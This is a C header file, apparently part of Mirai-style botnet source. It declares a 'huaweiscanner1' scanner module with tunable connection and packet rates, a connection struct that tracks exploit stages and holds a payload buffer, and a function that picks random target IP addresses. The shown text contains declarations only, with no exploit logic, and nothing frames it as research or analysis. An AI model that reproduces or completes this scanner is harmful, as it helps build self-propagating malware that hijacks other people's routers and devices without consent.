#pragma once

#include <stdint.h>

#include "includes.h"

#ifdef SCAN_MAX
#define huaweiscanner1_SCANNER_MAX_CONNS 512
#define huaweiscanner1_SCANNER_RAW_PPS 720
#else
#define huaweiscanner1_SCANNER_MAX_CONNS 128
#define huaweiscanner1_SCANNER_RAW_PPS 160
#endif

#ifdef SCAN_MAX
#define huaweiscanner1_SCANNER_RDBUF_SIZE 1024
#define huaweiscanner1_SCANNER_HACK_DRAIN 64
#else
#define huaweiscanner1_SCANNER_RDBUF_SIZE 256
#define huaweiscanner1_SCANNER_HACK_DRAIN 64
#endif

struct huaweiscanner1_scanner_connection
{
    int fd, last_recv;
    enum
    {
        huaweiscanner1_SC_CLOSED,
        huaweiscanner1_SC_CONNECTING,
        huaweiscanner1_SC_EXPLOIT_STAGE2,
        huaweiscanner1_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[huaweiscanner1_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void huaweiscanner1_scanner_init();
void huaweiscanner1_scanner_kill(void);

static void huaweiscanner1_setup_connection(struct huaweiscanner1_scanner_connection *);
static ipv4_t huaweiscanner1_get_random_ip(void);
